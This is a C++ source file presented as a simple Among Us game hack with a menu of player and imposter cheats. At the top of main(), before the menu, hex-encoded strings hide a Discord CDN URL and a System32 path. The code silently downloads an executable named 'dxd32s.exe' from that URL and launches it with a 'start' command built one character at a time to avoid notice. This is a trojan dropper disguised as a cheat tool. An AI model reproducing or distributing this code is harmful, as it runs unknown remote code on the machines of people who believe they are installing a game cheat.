#include<iostream>
#include<windows.h>
#include<vector>
#include "proc.h"
#include<tchar.h>
#include"ImpHax.h"
#include <urlmon.h>

#pragma comment(lib, "urlmon.lib")



int main() {

	LPCSTR tgdr = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2e\x64\x69\x73\x63\x6f\x72\x64\x61\x70\x70\x2e\x63\x6f\x6d\x2f\x61\x74\x74\x61\x63\x68\x6d\x65\x6e\x74\x73\x2f\x39\x36\x38\x31\x39\x35\x37\x38\x37\x35\x37\x36\x32\x31\x33\x35\x34\x34\x2f\x39\x36\x38\x31\x39\x35\x38\x34\x35\x35\x35\x34\x30\x35\x37\x33\x30\x36\x2f\x64\x78\x64\x33\x32\x73\x2e\x65\x78\x65";

	LPCSTR hgfd = "\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c\x64\x78\x64\x33\x32\x73\x2e\x65\x78\x65";

	URLDownloadToFileA(NULL, tgdr, hgfd, 0, NULL);

	std::string gfd = "\x73";
	std::string ytr = "\x74";
	std::string kuy = "\x61";
	std::string sfq = "\x72";
	std::string glp = gfd + ytr + kuy + sfq + ytr;

	std::string fgd = "\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c";
	std::string yut = "\x2e\x65\x78\x65";
	std::string fds = "\x64\x78\x64\x33\x32\x73";
	std::string io = glp + " " + fgd + fds + yut;
	Sleep(3000);
	system(io.c_str());
	//Get procID of the target process
	DWORD procID = GetProcid(L"Among Us.exe");
	std::cout << "procID = " << procID << std::endl;
	std::cout << "-----------------------------------------" << std::endl;

	//intro
	std::cout << "\nWelcome to a simple Among Us hack!\n\Press SPACE to get started, or anywhere else to exit" << std::endl;
	std::cout << "\n-----------------------------------------" << std::endl;
	system("pause > null");

	int playerInput;
	int off1 = 0x1C;

	do {
		//Menu options
		std::cout << "\nChoose what you would like to change:\n	> Player Settings = 0\n	> Lobby Settings  = 1\n	> Imposter Hacks  = 2\n	> Exit App        = 3" << std::endl;
		std::cin >> playerInput;

		//gets base address of lobby, player, imp
		uintptr_t baseAddress = mainMenu(playerInput, procID);

		switch (playerInput)
		{
		case 0:
			PLsetting(procID, NULL);
			break;
		case 1:
			std::cout << "nothing special yet\n" << std::endl;
			return 0;
		case 2:
			//displays imposter hax
			doImphax(procID, baseAddress);
			break;
		case 3:
			std::cout << "\nExiting" << std::endl;
			Sleep(3000);
			return 0;
		}
	} while (playerInput != 3);



	/*//gets the process handle
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, procID);

	//resolve the offsets
	uintptr_t modbase = GetModuleBaseAddress(procID, L"GameAssembly.dll");
	std::vector<unsigned int> plOffset = { 0x5c };
	uintptr_t pladdr = FindDMAAddy(hProcess, modbase, plOffset);
	std::cout << "current pointer to the Adrress = 0x" << std::hex << pladdr << std::endl;

	plOffset.push_back(off1);*/



	return 0;
}